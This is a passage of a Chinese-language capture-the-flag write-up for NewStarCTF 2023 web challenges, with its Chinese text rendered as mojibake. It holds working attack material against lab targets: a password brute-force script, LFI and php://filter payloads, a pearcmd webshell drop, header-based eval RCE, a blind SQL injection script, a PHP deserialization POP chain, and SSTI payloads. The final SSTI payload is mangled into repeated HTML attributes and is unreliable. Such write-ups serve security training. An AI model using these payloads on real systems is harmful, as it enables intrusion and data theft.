</span></code></pre><p>å¾ˆæ˜¾ç„¶ï¼Œç‚¹è¿›å»ä¸€çœ‹æ˜¯ä¸ªè¯ˆéª— flagï¼Œç»§ç»­ç ”ç©¶ç»ˆç«¯çš„ JavaScript æºç å‘ç°è¿™ä¸ªç»ˆç«¯æ˜¯ä¸ªè™šå‡çš„ç»ˆç«¯ï¼Œä½†åœ¨å…¶ä¸­è¿˜èƒ½å‘ç°ä¸€ä¸ª <code>admin</code> è´¦å·ï¼Œå¹¶ä¸”å­˜åœ¨ä¸€ä¸ªæç¤º <code>Maybe you need BurpSuite.</code> ï¼Œçœ‹æ¥ç”¨ bp è¿™æ–¹å‘æ²¡é”™ï¼Œé‚£å°±å¼€å§‹çˆ†ç ´å¯»æ‰¾ <code>admin</code> è´¦å·çš„å¯†ç ã€‚<p>ä»å›¾ä¸­å·²çŸ¥è¾“å…¥çš„å¯†ç ä¼šè¿›è¡Œ md5 åŠ å¯†ï¼Œé€šè¿‡ç¼–å†™ Python è„šæœ¬è¿›è¡Œçˆ†ç ´ï¼Œæˆ‘è¿™é‡Œçˆ†ç ´ç”¨çš„æ˜¯ rockyou.txt ï¼Œå¯ä»¥åœ¨ Kali ä¸­æ‰¾åˆ°ã€‚<pre class=z-code><code><span class="z-text z-plain">import requests
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as file:
</span><span class="z-text z-plain">    for line in file:
</span><span class="z-text z-plain">        line = line.strip()
</span><span class="z-text z-plain">        data = {"un": "admin", "pw": f"{hashlib.md5(str(line).encode(encoding='utf-8')).hexdigest()}", "rem": "0"}
</span><span class="z-text z-plain">        ret = requests.post('http://node4.buuoj.cn:25956/signin.php', data=data)
</span><span class="z-text z-plain">        if 'div class="alert alert-success show' in ret.text:
</span><span class="z-text z-plain">            print(line)
</span><span class="z-text z-plain">            break
</span><span class="z-text z-plain">            
</span><span class="z-text z-plain"># 000000 
</span></code></pre><p>é€šè¿‡å°†å¾—åˆ°çš„å¯†ç æ‰‹åŠ¨å†è¿›è¡Œä¸€æ¬¡ç™»å½•æ“ä½œï¼Œå°±å¯ä»¥å¾—åˆ° flag äº†ã€‚<h3 id=week-2-include-0-0>[Week 2]include 0ã€‚0<a aria-label="Anchor link for: week-2-include-0-0" class=zola-anchor href=#week-2-include-0-0 style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">file=php://filter/read=convert.%2562ase64-encode/resource=flag.php
</span></code></pre><h3 id=week-2-unserialize>[Week 2]Unserializeï¼Ÿ<a aria-label="Anchor link for: week-2-unserialize" class=zola-anchor href=#week-2-unserialize style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">unser=O:4:"evil":1:{s:3:"cmd";s:35:"c\at /th1s_1s_fffflllll4444aaaggggg";}
</span></code></pre><h3 id=week-2-upload-again>[Week 2]Upload again!<a aria-label="Anchor link for: week-2-upload-again" class=zola-anchor href=#week-2-upload-again style=visibility:hidden></a></h3><h4 id=htaccess-rao-guo-rao-guo>.htaccess ç»•è¿‡ã€<code>&LT?</code> ç»•è¿‡<a aria-label="Anchor link for: htaccess-rao-guo-rao-guo" class=zola-anchor href=#htaccess-rao-guo-rao-guo style=visibility:hidden></a></h4><pre class=z-code><code><span class="z-text z-plain">&LTFilesMatch "shell.jpg">
</span><span class="z-text z-plain">SetHandler application/x-httpd-php
</span><span class="z-text z-plain">&LT/FilesMatch>
</span></code></pre><h3 id=week-2-r-c-e>[Week 2]R!!C!!E!!<a aria-label="Anchor link for: week-2-r-c-e" class=zola-anchor href=#week-2-r-c-e style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">/bo0g1pop.php?star=eval(array_rand(array_flip(getallheaders())));
</span><span class="z-text z-plain">User-Agent: system("cat /flag");
</span></code></pre><h3 id=week-2-you-xi-gao-shou>[Week 2]æ¸¸æˆé«˜æ‰‹<a aria-label="Anchor link for: week-2-you-xi-gao-shou" class=zola-anchor href=#week-2-you-xi-gao-shou style=visibility:hidden></a></h3><p>è¿›å…¥ Console<pre class=z-code><code><span class="z-text z-plain">gameScore=999999999999999
</span></code></pre><p>è¿è¡Œç©æ¸¸æˆç›´æ¥ç™½ç»™å°±å¯ä»¥å¾—åˆ° flag äº†ã€‚<h3 id=week-2-ez-sql>[Week 2]ez_sql<a aria-label="Anchor link for: week-2-ez-sql" class=zola-anchor href=#week-2-ez-sql style=visibility:hidden></a></h3><pre class=z-code><code><span class="z-text z-plain">$ python sqlmap.py -u http://ba57bf2c-be27-41e7-b824-792bf7347c7f.node4.buuoj.cn:81/?id=TMP0919 -D ctf --tables --dump-all
</span></code></pre><p>å¯ä»¥çˆ†ç ´æ•°æ®åº“åå­—ä¸º <code>ctf</code> ï¼Œè¡¨å <code>here_is_flag</code> ï¼Œå­—æ®µå <code>flag</code> ï¼Œä»¥åŠ flagã€‚<h3 id=week-3-include-pear>[Week 3]Include ğŸ<a aria-label="Anchor link for: week-3-include-pear" class=zola-anchor href=#week-3-include-pear style=visibility:hidden></a></h3><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯ LFI to RCEã€‚<p>æ‰“å¼€é¡µé¢æºä»£ç å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">    error_reporting(0);
</span><span class="z-text z-plain">    if(isset($_GET['file'])) {
</span><span class="z-text z-plain">        $file = $_GET['file'];
</span><span class="z-text z-plain">        
</span><span class="z-text z-plain">        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
</span><span class="z-text z-plain">            die('hacker!');
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">        
</span><span class="z-text z-plain">        include($file.".php");
</span><span class="z-text z-plain">        # Something in phpinfo.php!
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">    else {
</span><span class="z-text z-plain">        highlight_file(__FILE__);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">?>
</span></code></pre><p>é€šè¿‡æ„é€  payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">file=phpinfo
</span></code></pre><p>å¯ä»¥å‘ç° env å­˜åœ¨å±æ€§ FLAG å€¼ä¸º <code>fake{Check_register_argc_argv}</code> ï¼Œé€šè¿‡æŸ¥çœ‹å±æ€§ register_argc_argv å¯ä»¥å‘ç°å€¼ä¸º <code>On</code> ã€‚<blockquote><p>https://cloud.tencent.com/developer/article/2204400</blockquote><p>register_argc_argv å‘Šè¯‰PHPæ˜¯å¦å£°æ˜äº† <code>argv</code> å’Œ <code>argc</code> å˜é‡ï¼Œè¿™äº›å˜é‡å¯ä»¥æ˜¯ POST ä¿¡æ¯ã€ä¹Ÿå¯ä»¥æ˜¯ GET ä¿¡æ¯ï¼Œè®¾ç½®ä¸º TRUE æ—¶ï¼Œèƒ½å¤Ÿé€šè¿‡ CLI SAPI æŒç»­è¯»å– argc å˜é‡ï¼ˆä¼ é€’ç»™åº”ç”¨ç¨‹åºçš„è‹¥å¹²å‚æ•°ï¼‰å’Œ argv å˜é‡ï¼ˆå®é™…å‚æ•°çš„æ•°ç»„ï¼‰ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨ CLI SAPI æ—¶ï¼ŒPHPå˜é‡ argc å’Œ argv ä¼šè‡ªåŠ¨å¡«å……ä¸ºåˆé€‚çš„å€¼ï¼Œå¹¶ä¸”å¯ä»¥åœ¨SERVERæ•°ç»„ä¸­æ‰¾åˆ°è¿™äº›å€¼ï¼Œæ¯”å¦‚ $_SERVER[â€˜argvâ€™] ã€‚<p>å½“æ„é€  payload <code>a=a+b+c</code> çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡ <code>var_dump($_SERVER['argv']);</code> è¾“å‡º <code>array(1){[0]=>string(3)"a=a" [1]=>string(1)"b" [2]=>string(1)"c"}</code> ï¼Œå³é€šè¿‡ <code>+</code> ä½œä¸ºåˆ†å‰²ç¬¦ã€‚<p>é€šè¿‡æ„é€  payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">file=/usr/local/lib/php/pearcmd&+config-create+/&LT?=@eval($_POST[1])?>+./1.php
</span></code></pre><p>å¯ä»¥å¾—åˆ°å›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">Successfully created default configuration file "/var/www/html/1.php"
</span></code></pre><p>é€šè¿‡è®¿é—® <code>1.php</code> ï¼Œå¹¶æ„é€  payload å¦‚ä¸‹å³å¯å¾—åˆ° flagã€‚<pre class=z-code><code><span class="z-text z-plain">1=system("cat /flag");
</span></code></pre><h3 id=week-3-medium-sql>[Week 3]medium_sql<a aria-label="Anchor link for: week-3-medium-sql" class=zola-anchor href=#week-3-medium-sql style=visibility:hidden></a></h3><p>æ ¹æ®é¢˜ç›®æè¿°å¯ä»¥å¾—å‡ºéœ€è¦è¿›è¡Œä¸€äº›ç»•è¿‡ï¼Œå…ˆæŸ¥çœ‹é‚£äº›å…³é”®è¯è¢«è¿‡æ»¤äº†ã€‚<p>è¿‡æ»¤å…³é”®è¯ï¼šunionã€# ï¼Œå‘ç°å›æ˜¾åªæœ‰ <code>id not exists</code> è¿˜æœ‰ ID æ­£ç¡®æ—¶çš„è¾“å‡ºï¼Œæ•…å°è¯•å¸ƒå°”æ³¨å…¥ï¼Œç»æµ‹è¯• <code>selectã€orã€whereã€ascii</code> éœ€è¦è¿›è¡Œå¤§å°å†™ç»•è¿‡ã€‚<pre class=z-code><code><span class="z-text z-plain">import requests
</span><span class="z-text z-plain">import time
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">target = "http://c14df6c5-9f87-4cfa-bd7a-9dd3bca93bf4.node4.buuoj.cn:81/"
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def getDataBase():  # è·å–æ•°æ®åº“å
</span><span class="z-text z-plain">    database_name = ""
</span><span class="z-text z-plain">    for i in range(1, 1000):  # æ³¨æ„æ˜¯ä»1å¼€å§‹ï¼Œsubstrå‡½æ•°ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹æˆªå–
</span><span class="z-text z-plain">        low = 32
</span><span class="z-text z-plain">        high = 127
</span><span class="z-text z-plain">        mid = (low + high) // 2
</span><span class="z-text z-plain">        while low < high:  # äºŒåˆ†æ³•
</span><span class="z-text z-plain">            params = {
</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(database()))," + str(i) + ",1))>" + str(mid) + ")%23"
</span><span class="z-text z-plain">            }
</span><span class="z-text z-plain">            time.sleep(0.1)
</span><span class="z-text z-plain">            r = requests.get(url=target+'?id='+params["id"])
</span><span class="z-text z-plain">            if "Physics" in r.text:  # ä¸ºçœŸæ—¶è¯´æ˜è¯¥å­—ç¬¦åœ¨asciiè¡¨åé¢ä¸€åŠ
</span><span class="z-text z-plain">                low = mid + 1
</span><span class="z-text z-plain">            else:
</span><span class="z-text z-plain">                high = mid
</span><span class="z-text z-plain">            mid = (low + high) // 2
</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
</span><span class="z-text z-plain">            break
</span><span class="z-text z-plain">        database_name += chr(mid)  # å°†asciiç è½¬æ¢ä¸ºå­—ç¬¦
</span><span class="z-text z-plain">        print(database_name)
</span><span class="z-text z-plain">    return "æ•°æ®åº“åï¼š" + database_name
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def getTable():  # è·å–è¡¨å
</span><span class="z-text z-plain">    column_name = ""
</span><span class="z-text z-plain">    for i in range(1, 1000):
</span><span class="z-text z-plain">        low = 32
</span><span class="z-text z-plain">        high = 127
</span><span class="z-text z-plain">        mid = (low + high) // 2
</span><span class="z-text z-plain">        while low < high:
</span><span class="z-text z-plain">            params = {
</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(table_name))from(infOrmation_schema.tables)wHere(table_schema='ctf'))," + str(
</span><span class="z-text z-plain">                    i) + ",1))>" + str(mid) + ")%23"
</span><span class="z-text z-plain">            }
</span><span class="z-text z-plain">            time.sleep(0.1)
</span><span class="z-text z-plain">            r = requests.get(url=target + '?id=' + params["id"])
</span><span class="z-text z-plain">            if "Physics" in r.text:
</span><span class="z-text z-plain">                low = mid + 1
</span><span class="z-text z-plain">            else:
</span><span class="z-text z-plain">                high = mid
</span><span class="z-text z-plain">            mid = (low + high) // 2
</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
</span><span class="z-text z-plain">            break
</span><span class="z-text z-plain">        column_name += chr(mid)
</span><span class="z-text z-plain">        print(column_name)
</span><span class="z-text z-plain">    return "è¡¨åä¸ºï¼š" + column_name
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def getColumn():  # è·å–åˆ—å
</span><span class="z-text z-plain">    column_name = ""
</span><span class="z-text z-plain">    for i in range(1, 250):
</span><span class="z-text z-plain">        low = 32
</span><span class="z-text z-plain">        high = 127
</span><span class="z-text z-plain">        mid = (low + high) // 2
</span><span class="z-text z-plain">        while low < high:
</span><span class="z-text z-plain">            params = {
</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(column_name))from(infOrmation_schema.columns)wHere(table_name='here_is_flag'))," + str(
</span><span class="z-text z-plain">                    i) + ",1))>" + str(mid) + ")%23"
</span><span class="z-text z-plain">            }
</span><span class="z-text z-plain">            time.sleep(0.1)
</span><span class="z-text z-plain">            r = requests.get(url=target + '?id=' + params["id"])
</span><span class="z-text z-plain">            if 'Physics' in r.text:
</span><span class="z-text z-plain">                low = mid + 1
</span><span class="z-text z-plain">            else:
</span><span class="z-text z-plain">                high = mid
</span><span class="z-text z-plain">            mid = (low + high) // 2
</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
</span><span class="z-text z-plain">            break
</span><span class="z-text z-plain">        column_name += chr(mid)
</span><span class="z-text z-plain">        print(column_name)
</span><span class="z-text z-plain">    return "åˆ—åä¸ºï¼š" + column_name
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">def getFlag():  # è·å–flag
</span><span class="z-text z-plain">    flag = ""
</span><span class="z-text z-plain">    for i in range(1, 1000):
</span><span class="z-text z-plain">        low = 32
</span><span class="z-text z-plain">        high = 127
</span><span class="z-text z-plain">        mid = (low + high) // 2
</span><span class="z-text z-plain">        while low < high:
</span><span class="z-text z-plain">            params = {
</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(flag))from(here_is_flag))," + str(i) + ",1))>" + str(mid) + ")%23"
</span><span class="z-text z-plain">            }
</span><span class="z-text z-plain">            time.sleep(0.1)
</span><span class="z-text z-plain">            r = requests.get(url=target + '?id=' + params["id"])
</span><span class="z-text z-plain">            if 'Physics' in r.text:
</span><span class="z-text z-plain">                low = mid + 1
</span><span class="z-text z-plain">            else:
</span><span class="z-text z-plain">                high = mid
</span><span class="z-text z-plain">            mid = (low + high) // 2
</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
</span><span class="z-text z-plain">            break
</span><span class="z-text z-plain">        flag += chr(mid)
</span><span class="z-text z-plain">        print(flag)
</span><span class="z-text z-plain">    return "flag:" + flag
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">a = getDataBase()
</span><span class="z-text z-plain">b = getTable()
</span><span class="z-text z-plain">c = getColumn()
</span><span class="z-text z-plain">d = getFlag()
</span><span class="z-text z-plain">print(a)
</span><span class="z-text z-plain">print(b)
</span><span class="z-text z-plain">print(c)
</span><span class="z-text z-plain">print(d)
</span></code></pre><h3 id=week-3-pop-gadget>[Week 3]POP Gadget<a aria-label="Anchor link for: week-3-pop-gadget" class=zola-anchor href=#week-3-pop-gadget style=visibility:hidden></a></h3><p>æºä»£ç <pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Begin{
</span><span class="z-text z-plain">    public $name;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __destruct()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
</span><span class="z-text z-plain">            echo "Hello";
</span><span class="z-text z-plain">        }else{
</span><span class="z-text z-plain">            echo "Welcome to NewStarCTF 2023!";
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Then{
</span><span class="z-text z-plain">    private $func;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __toString()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        ($this->func)();
</span><span class="z-text z-plain">        return "Good Job!";
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Handle{
</span><span class="z-text z-plain">    protected $obj;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __call($func, $vars)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->obj->end();
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Super{
</span><span class="z-text z-plain">    protected $obj;
</span><span class="z-text z-plain">    public function __invoke()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->obj->getStr();
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function end()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        die("==GAME OVER==");
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class CTF{
</span><span class="z-text z-plain">    public $handle;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function end()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        unset($this->handle->log);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class WhiteGod{
</span><span class="z-text z-plain">    public $func;
</span><span class="z-text z-plain">    public $var;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __unset($var)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        ($this->func)($this->var);    
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@unserialize($_POST['pop']);
</span></code></pre><p>POPé“¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">Begin::__destruct()->Then::__toString()->Super::__invoke()->Handle::__call($func, $vars)->CTF::end()->WhiteGod::__unset($var)
</span></code></pre><p>æ„é€  Payload è¿‡ç¨‹å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">&LT?php
</span><span class="z-text z-plain">highlight_file(__FILE__);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Begin{
</span><span class="z-text z-plain">    public $name;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __destruct()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
</span><span class="z-text z-plain">            echo "Hello";
</span><span class="z-text z-plain">        }else{
</span><span class="z-text z-plain">            echo "Welcome to NewStarCTF 2023!";
</span><span class="z-text z-plain">        }
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Then{
</span><span class="z-text z-plain">    private $func;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __construct($super)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->func = $super;
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __toString()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        ($this->func)();
</span><span class="z-text z-plain">        return "Good Job!";
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Handle{
</span><span class="z-text z-plain">    protected $obj;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __construct($ctf)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->obj = $ctf;
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __call($func, $vars)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->obj->end();
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class Super{
</span><span class="z-text z-plain">    protected $obj;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __construct($handle)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->obj = $handle;
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __invoke()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        $this->obj->getStr();
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function end()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        die("==GAME OVER==");
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class CTF{
</span><span class="z-text z-plain">    public $handle;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function end()
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        unset($this->handle->log);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">class WhiteGod{
</span><span class="z-text z-plain">    public $func;
</span><span class="z-text z-plain">    public $var;
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">    public function __unset($var)
</span><span class="z-text z-plain">    {
</span><span class="z-text z-plain">        ($this->func)($this->var);
</span><span class="z-text z-plain">    }
</span><span class="z-text z-plain">}
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">@unserialize($_POST['pop']);
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">$begin = new Begin();
</span><span class="z-text z-plain">$ctf = new CTF();
</span><span class="z-text z-plain">$handle = new Handle($ctf);
</span><span class="z-text z-plain">$super = new Super($handle);
</span><span class="z-text z-plain">$begin->name = new Then($super);
</span><span class="z-text z-plain">$ctf->handle = new WhiteGod();
</span><span class="z-text z-plain">$ctf->handle->func = "system";
</span><span class="z-text z-plain">$ctf->handle->var = "cat /flag";
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">echo urlencode(serialize($begin));
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">// O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D
</span></code></pre><h3 id=week-3-genshin>[Week 3]GenShin<a aria-label="Anchor link for: week-3-genshin" class=zola-anchor href=#week-3-genshin style=visibility:hidden></a></h3><p>é€šè¿‡æŸ¥çœ‹ Network - Headers å¯ä»¥å‘ç° Pop å±æ€§å€¼ä¸º <code>/secr3tofpop</code> ï¼Œé€šè¿‡è®¿é—®å¯ä»¥å¾—åˆ°å›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">please give a name by get
</span></code></pre><p>é€šè¿‡æ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">name=123
</span></code></pre><p>å¯ä»¥å¾—åˆ°å›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">Welcome to NewstarCTF 2023 123
</span></code></pre><p>çŒœæµ‹åº”è¯¥æ˜¯ Python çš„ SSTI æ³¨å…¥ï¼Œé€šè¿‡æ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">name={{7*7}}
</span></code></pre><p>å¾—åˆ°å›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">big hacker!get away from me!
</span></code></pre><p>å°è¯•å¦å¤–ä¸€ç§ Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">name=&LTdiv data-gb-custom-block data-tag="print" data-0='7' data-1='7' data-2='7' data-3='7'>&LT/div>
</span></code></pre><p>å¯ä»¥å¾—åˆ°å›æ˜¾å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">Welcome to NewstarCTF 2023 49
</span></code></pre><p>æ•…åˆ¤æ–­å¯ä»¥é€šè¿‡æ­¤æ–¹æ³•ç»§ç»­è¿›è¡Œ SSTI æ³¨å…¥ï¼Œé€šè¿‡å°è¯•å„ç§å…³é”®å­—å¯ä»¥å‘ç° <code>å•å¼•å·, init, lipsum, url_for, åæ–œæ , popen</code> è¢«è¿‡æ»¤äº†ã€‚<p>é€šè¿‡æ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">name=
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">&LTdiv data-gb-custom-block data-tag="print" data-0=''>&LT/div>
</span></code></pre><p>å¯ä»¥è¾“å‡ºæ‰€æœ‰çš„å­ç±»ï¼Œè¢«è¿‡æ»¤çš„å…³é”®å­—å¯ä»¥é€šè¿‡ <code>|attr()</code> è¿›è¡Œç»•è¿‡ï¼Œç”±äºç›´æ¥ä½¿ç”¨ eval æ— æ³•ä½¿ç”¨ chr å‡½æ•°ï¼Œå› æ­¤éœ€è¦é€šè¿‡åœ¨é‡Œé¢å¤šå¥—ä¸€å±‚ eval æ¥å®ç°ï¼Œç”±äºå·²ç»å­˜åœ¨å•åŒå¼•å·äº†ï¼Œæ‰€ä»¥å°±ç›´æ¥å…¨ç”¨ chr å‡½æ•°æ¥å®ç°æ³¨å…¥å§ï¼Œç”Ÿæˆè„šæœ¬å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">string = "__import__('os').popen('cat /flag').read()"
</span><span class="z-text z-plain">output = ""
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">for char in string:
</span><span class="z-text z-plain">    output += f"chr({ord(char)})%2b"
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">print(output)
</span><span class="z-text z-plain">"""
</span><span class="z-text z-plain">chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41)
</span><span class="z-text z-plain">"""
</span></code></pre><p>æ„é€  Payload å¦‚ä¸‹<pre class=z-code><code><span class="z-text z-plain">name=
</span><span class="z-text z-plain">
</span><span class="z-text z-plain">&LTdiv data-gb-custom-block data-tag="print" data-0='' data-1='' data-2='132' data-3='132' data-4='132' data-5='132' data-6='132' data-7='132' data-8='132' data-9='132' data-10='132' data-11='132' data-12='132' data-13='132' data-14='132' data-15='2' data-16='__in' data-17='__in' data-18='+' data-19=')|attr(' data-20='__globals__' data-21='))[' data-22='__builtins__' data-23='].eval(' data-24='95' data-25='95' data-26='95' data-27='95' data-28='95' data-29='5' data-30='2' data-31='2' data-32='2' data-33='95' data-34='95' data-35='95' data-36='5' data-37='2' data-38='2' data-39='2' data-40='105' data-41='105' data-42='5' data-43='2' data-44='2' data-45='2' data-46='109' data-47='109' data-48='9' data-49='2' data-50='2' data-51='2' data-52='112' data-53='112' data-54='12' data-55='2' data-56='2' data-57='2' data-58='111' data-59='111' data-60='11' data-61='2' data-62='2' data-63='2' data-64='114' data-65='114' data-66='14' data-67='2' data-68='2' data-69='2' data-70='116' data-71='116' data-72='16' data-73='2' data-74='2' data-75='2' data-76='95' data-77='95' data-78='95' data-79='5' data-80='2' data-81='2' data-82='2' data-83='95' data-84='95' data-85='95' data-86='5' data-87='2' data-88='2' data-89='2' data-90='40' data-91='40' data-92='40' data-93='0' data-94='2' data-95='2' data-96='2' data-97='39' data-98='39' data-99='39' data-100='9' data-101='2' data-102='2' data-103='2' data-104='111' data-105='111' data-106='11' data-107='2' data-108='2' data-109='2' data-110='115' data-111='115' data-112='15' data-113='2' data-114='2' data-115='2' data-116='39' data-117='39' data-118='39' data-119='9' data-120='2' data-121='2' data-122='2' data-123='41' data-124='41' data-125='41' data-126='1' data-127='2' data-128='2' data-129='2' data-130='46' data-131='46' data-132='46' data-133='6' data-134='2' data-135='2' data-136='2' data-137='112' data-138='112' data-139='12' data-140='2' data-141='2' data-142='2' data-143='111' data-144='111' data-145='11' data-146='2' data-147='2' data-148='2' data-149='112' data-150='112' data-151='12' data-152='2' data-153='2' data-154='2' 